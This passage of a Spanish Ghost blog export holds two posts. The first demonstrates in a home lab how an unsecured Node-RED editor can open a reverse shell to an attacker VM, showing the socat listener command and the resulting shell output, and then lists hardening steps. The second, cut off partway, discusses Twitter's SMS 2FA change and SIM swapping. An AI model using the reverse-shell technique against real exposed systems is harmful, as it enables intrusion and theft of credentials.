            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"code\",{\"language\":\"powershell\",\"code\":\"@ikero ➜ ~ docker run -it -p 1880:1880 -v node_red_data:/data --name mynodered nodered/node-red\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/image-4.png\",\"width\":890,\"height\":289}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"Esta prueba se realiza utilizando contenedores Docker, pero es también posible hacerlo sin utilizar ninguna tecnología de contenedorización.\",\"backgroundColor\":\"yellow\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/nodered-esquema-2.svg\",\"width\":1042,\"height\":292}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/image-3.png\",\"width\":954,\"height\":575}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/01/image-5.png\",\"width\":709,\"height\":139}],[\"code\",{\"language\":\"bash\",\"code\":\"sudo socat -d -d TCP-LISTEN:9999 STDOUT\\n# 2023/01/15 02:57:47 socat[64557] W ioctl(5, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device\\n# 2023/01/15 02:57:47 socat[64557] N listening on AF=2 0.0.0.0:9999\\n# 2023/01/15 02:57:56 socat[64557] N accepting connection from AF=2 192.168.1.132:64267 on AF=2 192.168.1.138:9999\\n# 2023/01/15 02:57:56 socat[64557] N using stdout for reading and writing\\n# 2023/01/15 02:57:56 socat[64557] N starting data transfer loop with FDs [6,6] and [1,1]\\nwhoami\\n# node-red\\nls /\\n# bin\\n# data\\n# dev\\n# etc\\n# healthcheck.js\\n# home\\n# lib\\n# media\\n# mnt\\n# opt\\n# proc\\n# root\\n# run\\n# sbin\\n# srv\\n# sys\\n# tmp\\n# usr\\n# var\"}],[\"callout\",{\"calloutEmoji\":\"⚠️\",\"calloutText\":\"By default, the Node-RED editor is not secured - anyone who can access its IP address can access the editor and deploy changes.\",\"backgroundColor\":\"red\"}]],\"markups\":[[\"strong\"],[\"em\"],[\"a\",[\"href\",\"https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities\"]],[\"a\",[\"href\",\"https://nodered.org/docs/user-guide/runtime/securing-node-red\"]]],\"sections\":[[1,\"h2\",[[0,[],0,\"¿Qué es Node-RED?\"]]],[1,\"p\",[[0,[],0,\"Esta es la parte más aburrida del post, por lo que me voy a permitir el lujo de copiarlo de otro sitio en Internet.\"]]],[1,\"blockquote\",[[0,[],0,\"Node-RED es una herramienta de \"],[0,[0],0,\"programación visual que se implementa en dispositivos controladores de\"],[0,[1],2,\" hardware\"],[0,[0],1,\". \"],[0,[],0,\"Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. Es un \"],[0,[0],1,\"panel \"],[0,[],0,\"de\"],[0,[0,1],2,\" flow\"],[0,[],0,\" al que se pueden incorporar nodos que se comuniquen entre ellos y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube. Este sistema de representación\"],[0,[0],1,\" \"],[0,[],0,\"puede ayudarte a visualizar gráficamente el flujo de la información y consiste en su representación gráfica.\"]]],[1,\"p\",[[0,[],0,\"En otras palabras, es una plataforma que mediante cajitas que hacen distintas cosas, eres capaz de crear un \"],[0,[0],1,\"workflow \"],[0,[],0,\"de una forma visual y ver su representación de un solo vistazo.\"]]],[1,\"h2\",[[0,[],0,\"Preparación del escenario\"]]],[3,\"ol\",[[[0,[],0,\"Arranco \"],[0,[0],1,\"Docker \"],[0,[],0,\"en mi ordenador de casa con \"],[0,[0],1,\"Windows 11\"],[0,[],0,\".\"]]]],[10,0],[1,\"p\",[[0,[],0,\"2. Mapeo el puerto \"],[0,[1],1,\"1880\"],[0,[],0,\" del contenedor al \"],[0,[1],1,\"1880 \"],[0,[],0,\"de \"],[0,[0],1,\"Windows\"],[0,[],0,\", para que sea visible por otros equipos.\"]]],[1,\"p\",[[0,[],0,\"3. Confirmo que el contenedor está funcionando correctamente y podemos empezar con la prueba de concepto.\"]]],[10,1],[10,2],[1,\"h2\",[[0,[],0,\"De qué forma es vulnerable\"]]],[1,\"p\",[[0,[],0,\"Arranco una máquina virtual de tal forma que simularemos ser el atacante de la prueba. El esquema es el siguiente.\"]]],[10,3],[1,\"p\",[[0,[],0,\"Mi máquina virtual es capaz de acceder al puerto \"],[0,[1],1,\"1880 \"],[0,[],0,\"del PC con \"],[0,[1],1,\"Windows 11\"],[0,[],0,\" corriendo el contenedor de\"],[0,[0],1,\" Node-RED\"],[0,[],0,\".\"]]],[10,4],[1,\"p\",[[0,[],0,\"Los nodos de los cuales voy a sacar provecho son los siguientes:\"]]],[3,\"ul\",[[[0,[0],1,\"exec\"],[0,[],0,\": Ejecuta un comando de sistema y devuelve su salida.\"]],[[0,[0],1,\"tcp in\"],[0,[],0,\": Provee una muestra de acciones de entrada por TCP.\"]],[[0,[0],1,\"tcp out\"],[0,[],0,\": Provee una muestra de acciones de salida por TCP.\"]]]],[1,\"p\",[[0,[],0,\"Son solamente necesarios estos tres nodos para comprometer el sistema. El siguiente flujo entabla una \"],[0,[0],1,\"shell reversa\"],[0,[],0,\" por el puerto \"],[0,[1],1,\"9999\"]]],[10,5],[1,\"p\",[[0,[],0,\"Me pongo en escucha desde la máquina atacante con la IP 192.168.1.138 y veamos que ocurre.\"]]],[10,6],[1,\"p\",[[0,[],0,\"Ya tenemos acceso a la Shell del contenedor Docker. No debemos pensar bajo ningún concepto que por el hecho de usar contenedores ya estamos protegidos. Existen varias vulnerabilidades de tipo \"],[0,[2],1,\"Container Escape Vulnerability\"],[0,[],0,\" que hace que no debamos bajar la guardia simplemente por el hecho de usar contenedores.\"]]],[1,\"p\",[[0,[],0,\"A partir de aquí, debes pensar que cualquier cosa que estuviese dentro de tu sistema (o en otros sistemas, porque también se puede acabar saltando hacia otros equipos vulnerables del entorno) ha podido ser robada. Ya sean \"],[0,[0],1,\"Api Keys\"],[0,[],0,\" que utilizas para subir los datos a un proveedor \"],[0,[0],1,\"Cloud \"],[0,[],0,\"o contraseñas para acceder a otros sistemas que hayas pensado que almacenarlos dentro de una carpeta del contenedor era una buena idea.\"]]],[1,\"h2\",[[0,[],0,\"Cómo puedo hacerlo (un poco) más seguro.\"]]],[1,\"p\",[[0,[],0,\"Lo primero es seguir las recomendaciones que dice su propia página en \"],[0,[3],1,\"https://nodered.org/docs/user-guide/runtime/securing-node-red\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"En la primera línea nos encontramos el siguiente mensaje.\"]]],[10,7],[1,\"p\",[[0,[],0,\"A partir de aquí, lo que debe ser un \"],[0,[0],1,\"MUST \"],[0,[],0,\"en nuestra configuración debe ser:\"]]],[3,\"ul\",[[[0,[],0,\"Habilitar la ventana de Login en todos los casos.\"]],[[0,[],0,\"Separar credenciales entre los editores de los flujos y los usuarios normales.\"]],[[0,[],0,\"Habilitar HTTPs. Aunque sea con certificados autofirmados.\"]],[[0,[],0,\"Deshabilitar aquellos nodos que creamos que no son necesarios para nuestro tipo de trabajo. O mejor aún, deshabilitar todos y habilitar SOLO aquellos que son necesarios.\"]]]],[1,\"p\",[[0,[],0,\"Los flujos de Node-RED son, al fin y al cabo, una manera de desarrollar software \\\"más sencilla\\\". El hecho de ver una interfaz amigable no debe despistarnos de lo que es la plataforma en sí. Abrir la puerta a que cualquiera pueda desarrollar sus flujos sin ningún tipo de cuidado, puede ser peligroso.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<h2 id=\"%C2%BFqu%C3%A9-es-node-red\">¿Qué es Node-RED?</h2><p>Esta es la parte más aburrida del post, por lo que me voy a permitir el lujo de copiarlo de otro sitio en Internet.</p><blockquote>Node-RED es una herramienta de <strong>programación visual que se implementa en dispositivos controladores de<em> hardware</em></strong><strong>. </strong>Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. Es un <strong>panel </strong>de<strong><em> flow</em></strong> al que se pueden incorporar nodos que se comuniquen entre ellos y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube. Este sistema de representación<strong> </strong>puede ayudarte a visualizar gráficamente el flujo de la información y consiste en su representación gráfica.</blockquote><p>En otras palabras, es una plataforma que mediante cajitas que hacen distintas cosas, eres capaz de crear un <strong>workflow </strong>de una forma visual y ver su representación de un solo vistazo.</p><h2 id=\"preparaci%C3%B3n-del-escenario\">Preparación del escenario</h2><ol><li>Arranco <strong>Docker </strong>en mi ordenador de casa con <strong>Windows 11</strong>.</li></ol><pre><code class=\"language-powershell\">@ikero ➜ ~ docker run -it -p 1880:1880 -v node_red_data:/data --name mynodered nodered/node-red</code></pre><p>2. Mapeo el puerto <em>1880</em> del contenedor al <em>1880 </em>de <strong>Windows</strong>, para que sea visible por otros equipos.</p><p>3. Confirmo que el contenedor está funcionando correctamente y podemos empezar con la prueba de concepto.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/image-4.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"890\" height=\"289\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/image-4.png 600w, __GHOST_URL__/content/images/2023/01/image-4.png 890w\" sizes=\"(min-width: 720px) 720px\"></figure><div class=\"kg-card kg-callout-card kg-callout-card-yellow\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">Esta prueba se realiza utilizando contenedores Docker, pero es también posible hacerlo sin utilizar ninguna tecnología de contenedorización.</div></div><h2 id=\"de-qu%C3%A9-forma-es-vulnerable\">De qué forma es vulnerable</h2><p>Arranco una máquina virtual de tal forma que simularemos ser el atacante de la prueba. El esquema es el siguiente.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/nodered-esquema-2.svg\" class=\"kg-image\" alt loading=\"lazy\" width=\"1042\" height=\"292\"></figure><p>Mi máquina virtual es capaz de acceder al puerto <em>1880 </em>del PC con <em>Windows 11</em> corriendo el contenedor de<strong> Node-RED</strong>.</p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/image-3.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"954\" height=\"575\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/image-3.png 600w, __GHOST_URL__/content/images/2023/01/image-3.png 954w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Los nodos de los cuales voy a sacar provecho son los siguientes:</p><ul><li><strong>exec</strong>: Ejecuta un comando de sistema y devuelve su salida.</li><li><strong>tcp in</strong>: Provee una muestra de acciones de entrada por TCP.</li><li><strong>tcp out</strong>: Provee una muestra de acciones de salida por TCP.</li></ul><p>Son solamente necesarios estos tres nodos para comprometer el sistema. El siguiente flujo entabla una <strong>shell reversa</strong> por el puerto <em>9999</em></p><figure class=\"kg-card kg-image-card\"><img src=\"__GHOST_URL__/content/images/2023/01/image-5.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"709\" height=\"139\" srcset=\"__GHOST_URL__/content/images/size/w600/2023/01/image-5.png 600w, __GHOST_URL__/content/images/2023/01/image-5.png 709w\"></figure><p>Me pongo en escucha desde la máquina atacante con la IP 192.168.1.138 y veamos que ocurre.</p><pre><code class=\"language-bash\">sudo socat -d -d TCP-LISTEN:9999 STDOUT\n# 2023/01/15 02:57:47 socat[64557] W ioctl(5, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device\n# 2023/01/15 02:57:47 socat[64557] N listening on AF=2 0.0.0.0:9999\n# 2023/01/15 02:57:56 socat[64557] N accepting connection from AF=2 192.168.1.132:64267 on AF=2 192.168.1.138:9999\n# 2023/01/15 02:57:56 socat[64557] N using stdout for reading and writing\n# 2023/01/15 02:57:56 socat[64557] N starting data transfer loop with FDs [6,6] and [1,1]\nwhoami\n# node-red\nls /\n# bin\n# data\n# dev\n# etc\n# healthcheck.js\n# home\n# lib\n# media\n# mnt\n# opt\n# proc\n# root\n# run\n# sbin\n# srv\n# sys\n# tmp\n# usr\n# var</code></pre><p>Ya tenemos acceso a la Shell del contenedor Docker. No debemos pensar bajo ningún concepto que por el hecho de usar contenedores ya estamos protegidos. Existen varias vulnerabilidades de tipo <a href=\"https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities\">Container Escape Vulnerability</a> que hace que no debamos bajar la guardia simplemente por el hecho de usar contenedores.</p><p>A partir de aquí, debes pensar que cualquier cosa que estuviese dentro de tu sistema (o en otros sistemas, porque también se puede acabar saltando hacia otros equipos vulnerables del entorno) ha podido ser robada. Ya sean <strong>Api Keys</strong> que utilizas para subir los datos a un proveedor <strong>Cloud </strong>o contraseñas para acceder a otros sistemas que hayas pensado que almacenarlos dentro de una carpeta del contenedor era una buena idea.</p><h2 id=\"c%C3%B3mo-puedo-hacerlo-un-poco-m%C3%A1s-seguro\">Cómo puedo hacerlo (un poco) más seguro.</h2><p>Lo primero es seguir las recomendaciones que dice su propia página en <a href=\"https://nodered.org/docs/user-guide/runtime/securing-node-red\">https://nodered.org/docs/user-guide/runtime/securing-node-red</a>.</p><p>En la primera línea nos encontramos el siguiente mensaje.</p><div class=\"kg-card kg-callout-card kg-callout-card-red\"><div class=\"kg-callout-emoji\">⚠️</div><div class=\"kg-callout-text\">By default, the Node-RED editor is not secured - anyone who can access its IP address can access the editor and deploy changes.</div></div><p>A partir de aquí, lo que debe ser un <strong>MUST </strong>en nuestra configuración debe ser:</p><ul><li>Habilitar la ventana de Login en todos los casos.</li><li>Separar credenciales entre los editores de los flujos y los usuarios normales.</li><li>Habilitar HTTPs. Aunque sea con certificados autofirmados.</li><li>Deshabilitar aquellos nodos que creamos que no son necesarios para nuestro tipo de trabajo. O mejor aún, deshabilitar todos y habilitar SOLO aquellos que son necesarios.</li></ul><p>Los flujos de Node-RED son, al fin y al cabo, una manera de desarrollar software \"más sencilla\". El hecho de ver una interfaz amigable no debe despistarnos de lo que es la plataforma en sí. Abrir la puerta a que cualquiera pueda desarrollar sus flujos sin ningún tipo de cuidado, puede ser peligroso.</p>",
            "comment_id": "63c356e839046b006481bfb3",
            "plaintext": "¿Qué es Node-RED?\n\nEsta es la parte más aburrida del post, por lo que me voy a permitir el lujo de copiarlo de otro sitio en Internet.\n\nNode-RED es una herramienta de programación visual que se implementa en dispositivos controladores de hardware. Trabaja mostrando de manera visual las relaciones y funciones de manera que se pueda programar sin escribir. Es un panel de flow al que se pueden incorporar nodos que se comuniquen entre ellos y puede instalarse en equipos como ordenadores Windows, Linux, o en servidores en la nube. Este sistema de representación puede ayudarte a visualizar gráficamente el flujo de la información y consiste en su representación gráfica.\n\nEn otras palabras, es una plataforma que mediante cajitas que hacen distintas cosas, eres capaz de crear un workflow de una forma visual y ver su representación de un solo vistazo.\n\n\nPreparación del escenario\n\n 1. Arranco Docker en mi ordenador de casa con Windows 11.\n\n@ikero ➜ ~ docker run -it -p 1880:1880 -v node_red_data:/data --name mynodered nodered/node-red\n\n2. Mapeo el puerto 1880 del contenedor al 1880 de Windows, para que sea visible por otros equipos.\n\n3. Confirmo que el contenedor está funcionando correctamente y podemos empezar con la prueba de concepto.\n\n⚠️Esta prueba se realiza utilizando contenedores Docker, pero es también posible hacerlo sin utilizar ninguna tecnología de contenedorización.\n\n\nDe qué forma es vulnerable\n\nArranco una máquina virtual de tal forma que simularemos ser el atacante de la prueba. El esquema es el siguiente.\n\nMi máquina virtual es capaz de acceder al puerto 1880 del PC con Windows 11 corriendo el contenedor de Node-RED.\n\nLos nodos de los cuales voy a sacar provecho son los siguientes:\n\n * exec: Ejecuta un comando de sistema y devuelve su salida.\n * tcp in: Provee una muestra de acciones de entrada por TCP.\n * tcp out: Provee una muestra de acciones de salida por TCP.\n\nSon solamente necesarios estos tres nodos para comprometer el sistema. El siguiente flujo entabla una shell reversa por el puerto 9999\n\nMe pongo en escucha desde la máquina atacante con la IP 192.168.1.138 y veamos que ocurre.\n\nsudo socat -d -d TCP-LISTEN:9999 STDOUT\n# 2023/01/15 02:57:47 socat[64557] W ioctl(5, IOCTL_VM_SOCKETS_GET_LOCAL_CID, ...): Inappropriate ioctl for device\n# 2023/01/15 02:57:47 socat[64557] N listening on AF=2 0.0.0.0:9999\n# 2023/01/15 02:57:56 socat[64557] N accepting connection from AF=2 192.168.1.132:64267 on AF=2 192.168.1.138:9999\n# 2023/01/15 02:57:56 socat[64557] N using stdout for reading and writing\n# 2023/01/15 02:57:56 socat[64557] N starting data transfer loop with FDs [6,6] and [1,1]\nwhoami\n# node-red\nls /\n# bin\n# data\n# dev\n# etc\n# healthcheck.js\n# home\n# lib\n# media\n# mnt\n# opt\n# proc\n# root\n# run\n# sbin\n# srv\n# sys\n# tmp\n# usr\n# var\n\nYa tenemos acceso a la Shell del contenedor Docker. No debemos pensar bajo ningún concepto que por el hecho de usar contenedores ya estamos protegidos. Existen varias vulnerabilidades de tipo Container Escape Vulnerability que hace que no debamos bajar la guardia simplemente por el hecho de usar contenedores.\n\nA partir de aquí, debes pensar que cualquier cosa que estuviese dentro de tu sistema (o en otros sistemas, porque también se puede acabar saltando hacia otros equipos vulnerables del entorno) ha podido ser robada. Ya sean Api Keys que utilizas para subir los datos a un proveedor Cloud o contraseñas para acceder a otros sistemas que hayas pensado que almacenarlos dentro de una carpeta del contenedor era una buena idea.\n\n\nCómo puedo hacerlo (un poco) más seguro.\n\nLo primero es seguir las recomendaciones que dice su propia página en https://nodered.org/docs/user-guide/runtime/securing-node-red.\n\nEn la primera línea nos encontramos el siguiente mensaje.\n\n⚠️By default, the Node-RED editor is not secured - anyone who can access its IP address can access the editor and deploy changes.\n\nA partir de aquí, lo que debe ser un MUST en nuestra configuración debe ser:\n\n * Habilitar la ventana de Login en todos los casos.\n * Separar credenciales entre los editores de los flujos y los usuarios normales.\n * Habilitar HTTPs. Aunque sea con certificados autofirmados.\n * Deshabilitar aquellos nodos que creamos que no son necesarios para nuestro tipo de trabajo. O mejor aún, deshabilitar todos y habilitar SOLO aquellos que son necesarios.\n\nLos flujos de Node-RED son, al fin y al cabo, una manera de desarrollar software \"más sencilla\". El hecho de ver una interfaz amigable no debe despistarnos de lo que es la plataforma en sí. Abrir la puerta a que cualquiera pueda desarrollar sus flujos sin ningún tipo de cuidado, puede ser peligroso.",
            "feature_image": "__GHOST_URL__/content/images/2023/01/nodered-pwned.png",
            "featured": 0,
            "type": "post",
            "status": "published",
            "locale": null,
            "visibility": "public",
            "email_recipient_filter": "all",
            "created_at": "2023-01-15T01:29:12.000Z",
            "updated_at": "2023-01-15T02:27:29.000Z",
            "published_at": "2023-01-15T02:27:29.000Z",
            "custom_excerpt": null,
            "codeinjection_head": null,
            "codeinjection_foot": null,
            "custom_template": null,
            "canonical_url": null,
            "newsletter_id": null
          },
          {
            "id": "63f31c79331f0f005b7da685",
            "uuid": "ce241e24-b256-4d88-bb74-46b1597afaaf",
            "title": "No, Twitter no es inseguro",
            "slug": "no-twitter-no-ha-dejado-de-ser-seguro",
            "mobiledoc": "{\"version\":\"0.3.1\",\"atoms\":[],\"cards\":[[\"callout\",{\"calloutEmoji\":\"💡\",\"calloutText\":\"Según el FBI, los estafadores recurren cada vez con más frecuencia a las estafas de SIM swap. La oficina informó de que en 2021, el FBI recibió 1.611 informes de este tipo de delito. Las pérdidas superaron los 68 millones de dólares. <br><br>Desde enero de 2018 hasta diciembre de 2020, el FBI recibió solo 320 denuncias de SIM swap, y las víctimas de estos delitos perdieron alrededor de 12 millones de dólares.\",\"backgroundColor\":\"red\"}],[\"image\",{\"src\":\"__GHOST_URL__/content/images/2023/02/2fa_Excalidraw-1.png\",\"width\":850,\"height\":858}],[\"markdown\",{\"markdown\":\"1. Inicias sesión en una plataforma mediante un usuario y una contraseña.\\n2. Si la contraseña es correcta, se genera un desafio. Este desafio consiste en introducir una clave válida.\\n3. Dependiendo el método de **2FA** que tengas configurado, tienes hasta 3 formas de generar esa clave válida.\\n3.1. Te llega un SMS con una clave.\\n3.2. Mediante un USB especial, lo introduces en el ordenador y la aplicación lo reconoce, dando paso en caso de ser un USB correcto.\\n3.3. Mediante una aplicación tipo [Latch](https://latch.elevenpaths.com/) o Google Authenticator, se genera una clave que dura unos segundos y que tienes que introducir como desafio.\"}],[\"bookmark\",{\"version\":\"1.0\",\"type\":\"bookmark\",\"url\":\"https://www.incibe.es/protege-tu-empresa/blog/algo-sabes-tienes-eres-contrasenas-identidad-online\",\"metadata\":{\"url\":\"https://www.incibe.es/protege-tu-empresa/blog/algo-sabes-tienes-eres-contrasenas-identidad-online\",\"title\":\"Algo que sabes, algo que tienes y algo que eres. ¿Sabes de qué estamos hablando?\",\"description\":\"En la actualidad la utilización de contraseñas es un elemento básico y casi podríamos decir que cotidiano. Sin embargo, sigue presentando debilidades, relacionadas con la limitada capacidad humana\",\"author\":null,\"publisher\":\"INCIBE\",\"thumbnail\":\"https://www.incibe.es/sites/default/files/contenidos/blog/post_d5_txt3.png\",\"icon\":\"https://www.incibe.es/sites/default/files/iconos_ios/apple-touch-icon-180x180.png\"}}]],\"markups\":[[\"a\",[\"href\",\"https://blog.twitter.com/en_us/topics/product/2023/an-update-on-two-factor-authentication-using-sms-on-twitter\"]],[\"a\",[\"href\",\"https://www.antena3.com/noticias/tecnologia/twitter-cobrara-usuarios-proteger-sus-cuentas-autenticacion-dos-pasos-mediante-sms_2023021863f108f52b5c780001355f72.html\"]],[\"a\",[\"href\",\"https://cnnespanol.cnn.com/2023/02/19/twitter-cobrara-autenticacion-de-dos-factores-sms-trax/\"]],[\"a\",[\"href\",\"https://www.xataka.com/empresas-y-economia/pagas-u-olvidate-identificacion-dos-pasos-sms-ultimo-elon-para-empujar-twitter-blue\"]],[\"a\",[\"href\",\"https://help.twitter.com/es/using-twitter/twitter-blue\"]],[\"strong\"],[\"a\",[\"href\",\"https://help.twitter.com/es/managing-your-account/two-factor-authentication\"]],[\"a\",[\"href\",\"https://us.norton.com/blog/mobile/sim-swap-fraud#\"]],[\"a\",[\"href\",\"https://latch.elevenpaths.com/\"]],[\"a\",[\"href\",\"https://support.google.com/accounts/answer/1066447?hl=en&co=GENIE.Platform%3DAndroid\"]],[\"a\",[\"href\",\"https://www.microsoft.com/en-us/security/mobile-authenticator-app\"]]],\"sections\":[[1,\"p\",[[0,[],0,\"De hecho, n(os) ha hecho un favor.\"]]],[1,\"h1\",[[0,[],0,\"Contexto\"]]],[1,\"p\",[[0,[],0,\"El pasado \"],[0,[0],1,\"15 de febrero de 2023\"],[0,[],0,\" Twitter anunció que hacía un cambio en su política de seguridad. El cambio consistía en que el método de autenticación de doble factor vía SMS solo iba a mantenerse para aquellos usuarios que estuviesen suscritos a Twitter Blue. O dicho de otra manera, si no pagas 8€/mes, pierdes esta funcionalidad.\"]]],[1,\"p\",[[0,[],0,\"No son pocos los medios como \"],[0,[1],1,\"antena3\"],[0,[],0,\", \"],[0,[2],1,\"CNN\"],[0,[],0,\" u otros tecnológicos como \"],[0,[3],1,\"Xataka\"],[0,[],0,\" que se han hecho eco de esta noticia diciendo que Twitter despliega esta medida para favorecer a los usuarios de pago dejando en la estacada a aquellos que no pagasen por su marca de verificado o su \"],[0,[4],1,\"Twitter Blue\"],[0,[],0,\". Que la seguridad de una plataforma ahora es algo de unos pocos privilegiados. Y es que esta afirmación, es cuanto menos engañosa. Una media verdad que no busca informar realmente a las personas. Vamos a examinar por qué.\"]]],[1,\"p\",[[0,[5],0,\"Twitter ofrece (ofrecía) \"],[0,[6],1,\"3 métodos\"],[0,[],1,\" diferentes de autenticación de doble factor (o 2FA).\"]]],[3,\"ul\",[[[0,[],0,\"2FA vía SMS\"]],[[0,[],0,\"2FA vía TOTP app (time based one time password)\"]],[[0,[],0,\"2FA vía USB key\"]]]],[1,\"p\",[[0,[],0,\"En resumidas cuentas, lo que los 3 métodos consiguen, es que para acceder a tu cuenta, sea necesario una segunda forma de identificación. Y de las 3,\"],[0,[5],1,\" la que funciona mediante SMS es la más débil de todas\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"En este post de Norton podemos encontrarnos el siguiente titular: \"],[0,[7],1,\"SIM swap scams on the rise\"],[0,[],0,\".\"]]],[10,0],[1,\"p\",[[0,[],0,\"Aun en 2023, es relativamente fácil la forma en la que alguien puede suplantar nuestra tarjeta SIM, ya sea mediante ingeniería social contra uno de los operadores de nuestra compañía telefónica (la forma más común de llevarlo a cabo) o clonando físicamente la tarjeta. Y con ello, el 2FA sostenido mediante SMS pasa a ser absurdamente inútil. De hecho, si tu banco te envía por SMS una clave para acceder a tu cuenta corriente, CAMBIA de banco.\"]]],[1,\"p\",[[0,[5],1,\"Twitter, a día de hoy y no parece que vaya a cambiar, sigue permitiendo utilizar los otros 2 métodos de autenticación de doble factor para TODOS los usuarios, independientemente de su tipo de cuenta.\"]]],[1,\"p\",[[0,[],0,\"Solo aquellos que pagan, pueden seguir utilizando el método (más) inseguro de los 3.\"]]],[1,\"h1\",[[0,[],0,\"Que es 2FA\"]]],[1,\"p\",[[0,[],0,\"La autenticación en dos fases (\"],[0,[5],1,\"2FA\"],[0,[],0,\") es un \"],[0,[5],1,\"método de seguridad de administración de identidad y acceso que requiere dos formas de identificación para obtener acceso a los recursos y los datos.\"]]],[1,\"p\",[[0,[],0,\"La forma de funcionamiento es la siguiente:\"]]],[10,1],[10,2],[1,\"h1\",[[0,[],0,\"Cómo podemos mejorar la seguridad\"]]],[1,\"p\",[[0,[],0,\"¿De qué forma podemos incrementar la seguridad de acceso a una plataforma? Hay un mecanismo que, si bien no es infalible, dificulta mucho que alguien pueda suplantar nuestra identidad. La mejor forma de autenticación es cuando el método de autenticación tiene en cuenta las siguientes 3 cosas:\"]]],[3,\"ul\",[[[0,[5],1,\"Algo que sabes\"],[0,[],0,\", como por ejemplo un pin o una contraseña.\"]],[[0,[5],1,\"Algo que tienes\"],[0,[],0,\", como por ejemplo un dispositivo, token o aplicación.\"]],[[0,[5],1,\"Algo que eres,\"],[0,[],0,\" (autenticación biométrica), como una huella dactilar o reconocimiento facial.\"]]]],[10,3],[1,\"p\",[[0,[],0,\"Existen muchas aplicaciones en el mercado que permiten implementar \"],[0,[5],1,\"2FA \"],[0,[],0,\"(o incluso \"],[0,[5],1,\"MFA\"],[0,[],0,\") como \"],[0,[8],1,\"Latch\"],[0,[],0,\", \"],[0,[9],1,\"Google Authenticator\"],[0,[],0,\" o \"],[0,[10],1,\"Microsoft Authenticator\"],[0,[],0,\".\"]]],[1,\"p\",[[0,[],0,\"Pero tienen también su parte mala.\"]]],[3,\"ul\",[[[0,[],0,\"Para acceder a ellas, necesitarás una contraseña. Intenta que ésta sea lo suficientemente segura como para que no te la puedan robar.\"]],[[0,[],0,\"En algunos casos como \"],[0,[5],1,\"Google Auth\"],[0,[],0,\", si pierdes el dispositivo, tienes que contactar hasta con el mismísimo Joe Biden para recuperar el acceso al dispositivo.\"]]]],[1,\"p\",[[0,[],0,\"En definitiva, dependes al 100% de este mecanismo para acceder a todas tus cuentas.\"]]],[1,\"p\",[[0,[],0,\"Personalmente, me quedo con \"],[0,[5],1,\"Latch\"],[0,[],0,\", puesto que puedes configurar un método de autenticación biométrico para abrirla y si pierdes el dispositivo, puedes iniciar sesión desde cualquier sitio conectado a internet.\"]]],[1,\"h1\",[[0,[],0,\"Conclusión\"]]],[1,\"p\",[[0,[],0,\"Twitter sigue siendo tan seguro (o inseguro) como lo era antes. De hecho, se puede afirmar que trata mejor a sus usuarios gratuitos en este sentido que a aquellos que pasan por caja.\"]]],[1,\"p\",[[0,[],0,\"Cualquier plataforma hoy en día permite utilizar 2FA como método de autenticación alternativa y entre ellas, la que funciona vía SMS es la más insegura. Esto no quiere decir que dejemos de utilizarla si es nuestro caso. Siempre será mejor esto que entrar en tu cuenta solo con la contraseña. Pero como siempre, cuanto más mecanismos de seguridad utilices en tus cuentas, estarás un poco más protegido que los que no utilizan ninguna.\"]]]],\"ghostVersion\":\"4.0\"}",
            "lexical": null,
            "html": "<p>De hecho, n(os) ha hecho un favor.</p><h1 id=\"contexto\">Contexto</h1><p>El pasado <a href=\"https://blog.twitter.com/en_us/topics/product/2023/an-update-on-two-factor-authentication-using-sms-on-twitter\">15 de febrero de 2023</a> Twitter anunció que hacía un cambio en su política de seguridad. El cambio consistía en que el método de autenticación de doble factor vía SMS solo iba a mantenerse para aquellos usuarios que estuviesen suscritos a Twitter Blue. O dicho de otra manera, si no pagas 8€/mes, pierdes esta funcionalidad.</p><p>No son pocos los medios como <a href=\"https://www.antena3.com/noticias/tecnologia/twitter-cobrara-usuarios-proteger-sus-cuentas-autenticacion-dos-pasos-mediante-sms_2023021863f108f52b5c780001355f72.html\">antena3</a>, <a href=\"https://cnnespanol.cnn.com/2023/02/19/twitter-cobrara-autenticacion-de-dos-factores-sms-trax/\">CNN</a> u otros tecnológicos como <a href=\"https://www.xataka.com/empresas-y-economia/pagas-u-olvidate-identificacion-dos-pasos-sms-ultimo-elon-para-empujar-twitter-blue\">Xataka</a> que se han hecho eco de esta noticia diciendo que Twitter despliega esta medida para favorecer a los usuarios de pago dejando en la estacada a aquellos que no pagasen por su marca de verificado o su <a href=\"https://help.twitter.com/es/using-twitter/twitter-blue\">Twitter Blue</a>. Que la seguridad de una plataforma ahora es algo de unos pocos privilegiados. Y es que esta afirmación, es cuanto menos engañosa. Una media verdad que no busca informar realmente a las personas. Vamos a examinar por qué.</p><p><strong>Twitter ofrece (ofrecía) <a href=\"https://help.twitter.com/es/managing-your-account/two-factor-authentication\">3 métodos</a> diferentes de autenticación de doble factor (o 2FA).</strong></p><ul><li>2FA vía SMS</li><li>2FA vía TOTP app (time based one time password)</li><li>2FA vía USB key</li></ul><p>En resumidas cuentas, lo que los 3 métodos consiguen, es que para acceder a tu cuenta, sea necesario una segunda forma de 